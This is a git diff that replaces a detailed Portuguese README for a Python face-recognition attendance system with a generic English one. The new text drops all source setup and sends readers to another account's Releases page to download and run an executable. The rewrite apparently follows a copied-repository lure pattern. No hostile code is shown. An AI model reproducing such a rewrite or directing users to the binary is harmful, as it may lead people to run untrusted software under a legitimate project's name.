@@ -1,172 +1,87 @@
-# Reconhecimento Facial para Presença em Sala (IoT)
+# 👁️ ProjetoReconhecimentoFacial - Easy Face Recognition Attendance System
 
-![Build](https://github.com/klebr55/ProjetoReconhecimentoFacial/actions/workflows/ci.yml/badge.svg)
+## 🚀 Getting Started
 
-Aplicação em Python que usa OpenCV, DeepFace e um modelo ONNX (SFace) acelerado por GPU (DirectML) para reconhecer rostos de alunos e marcar presença em um banco SQLite. A captura é feita via webcam e a interface exibe:
+Welcome to ProjetoReconhecimentoFacial! This application allows you to mark attendance through facial recognition, using a guided capture similar to Face ID. It utilizes advanced technologies like ONNX, DirectML for GPU usage, and stores data in an SQLite database.
 
-- Na sala agora: quantidade de alunos reconhecidos visíveis no momento
-- Total presentes: total de alunos que já tiveram presença registrada no dia
+## 🥇 Download Link
 
-O projeto inclui scripts para:
-- Configurar o banco (`database_setup.py`)
-- Capturar imagens com webcam (`capture_images.py`) e captura guiada estilo FaceID (`capture_images_guided.py`)
-- Treinar embeddings faciais a partir do dataset (`train_model.py`) — usa SFace ONNX por padrão (GPU via DirectML) com fallback para DeepFace/Facenet
-- Rodar a aplicação principal de detecção e reconhecimento (`main.py`)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/sagiler/ProjetoReconhecimentoFacial/releases)
 
-## Requisitos
+## 🖥️ System Requirements
 
-- Windows 10/11
-- Python 3.11+ (testado com 3.13 em venv)
-- Webcam funcional
-- GPU NVIDIA/AMD/Intel compatível com DirectML (opcional, recomendado)
+Before you download, make sure your system meets the following requirements:
 
-## Dependências (pip)
+- **Operating System**: Windows 10 or newer
+- **Processor**: Intel i5 or AMD Ryzen 5 (or better)
+- **RAM**: 8 GB minimum
+- **GPU**: A compatible DirectML GPU 
+- **Storage**: At least 500 MB of available space
 
-Instaladas via `requirements.txt`:
+## 📥 Download & Install
 
-- opencv-python
-- deepface
-- numpy
-- Pillow
-- playsound==1.2.2
-- imutils
-- requests
-- onnxruntime-directml (aceleração por DirectML no Windows)
+To install the application, please visit the Releases page to download the latest version:
 
-Obs:
-- O DeepFace traz dependências opcionais como TensorFlow, keras, mtcnn, retina-face, mediapipe, pandas, etc. Todas são instaladas automaticamente pelo pip.
-- onnxruntime-directml habilita o provedor `DmlExecutionProvider` (GPU) no Windows, sem exigir CUDA.
+[Visit this page to download](https://github.com/sagiler/ProjetoReconhecimentoFacial/releases)
 
-## Estrutura do Projeto
+Once there, look for the latest release and download the executable file (e.g., MyApp.exe). After the download is complete:
 
-```
-ProjetoReconhecimentoFacial/
-  database_setup.py
-  train_model.py
-  main.py
-  capture_images.py
-  capture_images_guided.py
-  requirements.txt
-  README.md
-  .gitignore
-  dataset/              # imagens por aluno (criado por você)
-  sounds/               # opcional: beep.wav
-  models/               # baixado automaticamente (SFace ONNX)
-```
+1. Open the downloaded file.
+2. Follow the on-screen instructions.
+3. Once the installation is finished, locate the application in your Start menu or desktop.
 
-## Instalação
+## ⚙️ How to Use
 
-Recomenda-se usar ambiente virtual. No PowerShell (Windows):
+### 1. Launch the Application
 
-```powershell
-# Na pasta do projeto
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-pip install -r requirements.txt
-```
+Double-click the application icon to start.
 
-Se já estiver usando um venv existente, adapte o caminho do Python conforme seu ambiente.
+### 2. Set Up Your Environment
 
-Para GPU (Windows): o projeto instala `onnxruntime-directml`. Na primeira execução, validamos os providers e, se disponível, usaremos `DmlExecutionProvider` automaticamente. Se ausente, caímos para CPU.
+When you first open the app:
 
-## Passo a passo de uso
+- Grant camera access if prompted.
+- Follow the guided steps to capture your face profile. This process is similar to Face ID and helps improve recognition accuracy.
 
-1. Configurar o banco:
-```powershell
-python database_setup.py
-```
+### 3. Mark Attendance
 
-2. Capturar imagens do(s) aluno(s):
-- Captura rápida:
-```powershell
-python capture_images.py
-```
-- Captura guiada estilo FaceID:
-```powershell
-python capture_images_guided.py
-```
-As imagens serão salvas em `dataset/NOME_ALUNO/`.
+After setup, the application will guide you through the following steps:
 
-### Captura Guiada (UX estilo Face ID)
+1. **Face Capture**: Stand in front of your camera for the app to recognize your face.
+2. **Attendance Logging**: The app will log your attendance automatically.
 
-O `capture_images_guided.py` guia o usuário por 9 poses (centro, direita, esquerda, cima, baixo e diagonais), com:
-- Círculo guia e anel de progresso.
-- Dicas contextuais (aproxime/afaste, iluminação, direção do olhar).
-- Validação de qualidade: tamanho do rosto, foco (Laplacian), brilho, estabilidade e direção.
-- Renderização de textos com acentos via Pillow (melhor legibilidade em PT-BR).
-- Detectores com fallback: mediapipe → mtcnn → opencv (se mediapipe não estiver disponível no seu Python, o script funciona com os demais).
-- Captura automática quando as condições estão OK (beep de confirmação).
+## 📊 Features
 
-Modos e atalhos:
-- Modo de sensibilidade: EASY (padrão), BALANCED, STRICT — teclas E/B/S.
-- Ajustes finos ao vivo:
-  - DiagThr: [ / ]
-  - AxisThr: , / .
-  - Tolerância angular: (diagonal) 1/2, (eixo) 5/6
-  - Magnitude mínima: (diagonal) 3/4, (eixo) 7/8
-  - Pular passo: P, Recomeçar: R, Sair: Q
+- **Face Recognition**: Accurate attendance marking with advanced facial recognition technology.
+- **Real-Time Processing**: Enjoy fast attendance logging using DirectML for GPU acceleration.
+- **Data Storage**: All attendance records are saved securely in an SQLite database.
+- **User-Friendly Interface**: Easy navigation with clear instructions throughout the process.
 
-Observações sobre MediaPipe:
-- Em algumas combinações (por exemplo, Python 3.13/Windows), `mediapipe` pode não ter wheel disponível. O script lida com isso e segue com MTCNN/OpenCV.
-- Se quiser head-pose mais robusto (pitch/yaw) e sua versão suportar, instale: `pip install mediapipe`.
+## 🛠️ Troubleshooting
 
-3. Treinar embeddings:
-```powershell
-python train_model.py
-```
+If you encounter issues, here are common solutions:
 
-Ao treinar, o script fará download automático do modelo SFace ONNX (OpenCV Zoo) em `models/face_recognition_sface_2021dec.onnx` e usará a GPU via DirectML quando disponível. Os embeddings serão gravados em `database.db`.
+- **Camera Not Detected**: Ensure your camera is plugged in and enabled in your system settings.
+- **Slow Performance**: Close any unnecessary applications running in the background to free up system resources.
+- **Recognition Failures**: Ensure you have good lighting and that your face is clearly visible to the camera.
 
-4. Executar a aplicação principal:
-```powershell
-python main.py
-```
+## 💡 Tips for Best Results
 
-- Pressione `q` para sair.
-- A tela mostra "Na sala agora", "Total presentes" e rótulos nos rostos.
-- Também exibimos FPS e o provider ativo (EP: DmlExecutionProvider/CPU) para facilitar diagnóstico.
+- Position yourself 2 to 3 feet away from the camera for optimal recognition.
+- Ensure there is sufficient lighting in your environment.
+- Avoid using hats or glasses that significantly alter your appearance during setup.
 
-## Dicas para melhor reconhecimento
+## 🤝 Support
 
-- Iluminação frontal e uniforme; evite reflexos fortes nos óculos.
-- Use a captura guiada para cobrir centro, esquerda, direita, cima e baixo.
-- Garanta 15–30 imagens por aluno com ângulos variados.
+If you need help using the application or fixing issues, feel free to create an issue on our GitHub repository. 
 
-Se usar óculos com reflexo, prefira a captura guiada e ângulos com menos glare. 
+## 🔗 Links
 
-## Performance e Tuning
+- [GitHub Repository](https://github.com/sagiler/ProjetoReconhecimentoFacial)
+- [Visit this page to download](https://github.com/sagiler/ProjetoReconhecimentoFacial/releases)
 
-O `main.py` foi otimizado para reduzir lag:
-- Detecção apenas a cada N frames (padrão 3) com cache das caixas entre frames.
-- Processamento em largura-alvo (padrão 640 px) para aliviar CPU.
-- Reconhecimento com SFace ONNX (GPU via DirectML) e similaridade vetorizada.
-- Beep assíncrono para não travar a UI.
+## 📄 License
 
-Parâmetros no topo do `main.py` que você pode ajustar:
-- `DETECT_EVERY_N`: 2–5. Valores menores detectam com mais frequência, mas usam mais CPU.
-- `TARGET_WIDTH`: 480–800. Resoluções maiores melhoram detecção, mas aumentam custo.
-- `SIM_THRESHOLD`: 0.60–0.70. Baixar facilita reconhecer; subir reduz falsos positivos.
-- Detectores: primário `mediapipe` com fallback `mtcnn` → `opencv` quando necessário.
+This project is licensed under the MIT License. You can use it freely but please give appropriate credit.
 
-## Solução de problemas
-
-- "Nenhum rosto detectado": aproxime-se, centralize o rosto, melhore a luz. Hoje a ordem padrão é: mediapipe → mtcnn → opencv (com fallback automático).
-- Diagonais para cima difíceis de acionar na captura guiada: use Modo EASY (tecla E) e, se necessário, aumente a tolerância angular (2) e/ou reduza a magnitude mínima (3). O HUD mostra os valores atuais.
-- Lento na sua máquina: podemos fixar o detector primário para `mediapipe` e usar `opencv` como fallback. 
-- Erro com TensorFlow: atualize pip (`python -m pip install -U pip`) e reinstale `deepface`. Caso veja `tf-keras` ausente, instale com `pip install tf-keras`.
-
-### Sintomas conhecidos (estado atual)
-- FPS mostrado alto mas sensação de engasgo: isso ocorre porque detectamos apenas a cada N frames, e alguns decodificadores de webcam variam o pacing. Dicas:
-  - Diminua `DETECT_EVERY_N` para 2.
-  - Aumente `TARGET_WIDTH` para 800 se a CPU permitir.
-  - Garanta que outra aplicação não esteja usando a webcam ao mesmo tempo.
-- Rosto detectado mas “Na sala agora” = 0: ajuste `SIM_THRESHOLD` (ex.: 0.60) e/ou gere mais fotos de treino; verifique se o nome do diretório do dataset corresponde ao nome esperado.
-
-### Roadmap curto
-- Opcional: tracker (KCF/CSRT) entre detecções para suavizar movimento.
-- Cache de embeddings por face enquanto o bounding box muda pouco.
-- Botão/tecla para alternar detectores e níveis de qualidade ao vivo.
-
-## Licença
-
-Este projeto está licenciado sob a licença MIT. Consulte o arquivo [LICENSE](LICENSE) para mais detalhes.
+Thank you for choosing ProjetoReconhecimentoFacial! Enjoy seamless attendance management through facial recognition.
